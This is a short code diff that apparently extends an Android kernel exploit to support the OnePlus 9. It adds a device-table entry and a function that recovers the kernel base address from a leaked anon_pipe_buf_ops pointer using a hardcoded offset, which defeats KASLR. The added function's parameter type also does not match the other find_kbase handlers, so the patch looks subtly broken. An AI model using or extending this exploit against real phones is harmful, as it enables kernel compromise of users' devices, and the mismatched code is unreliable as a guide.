@@ -68,7 +68,10 @@ struct rw_info;
 
 u64 samsung_kimg_to_lm(struct rw_info *rw, u64 kaddr);
 u64 pixel_kimg_to_lm(struct rw_info *rw, u64 kaddr);
-
+// OnePlus 9 (GKI 5.4.147) – anon_pipe_buf_ops offset from _text
+static inline uint64_t op9_find_kbase(uint64_t leaked_anon_pipe_buf_ops) {
+    return leaked_anon_pipe_buf_ops - 0x10c00c0;
+}
 u64 scan_kbase(struct rw_info *rw);
 u64 noop_kbase(struct rw_info *rw);
 u64 offset_kbase(struct rw_info *rw);
@@ -131,6 +134,14 @@ static struct device_config {
         .kernel_version = KERNEL_VERSION(5, 10, 66),
         .kimg_to_lm = pixel_kimg_to_lm,
         .find_kbase = noop_kbase,
+    },
+    {
+        .name = "OnePlus 9",
+        .model = "LE2115",
+        .android_version = 12,
+        .kernel_version = KERNEL_VERSION(5, 4, 147),
+        .kimg_to_lm = pixel_kimg_to_lm,  // start with Pixel-style mapping
+        .find_kbase = op9_find_kbase,
     },
     {
         /* Oriole 13.0.0 (TP1A.220905.004, Sep 2022) */
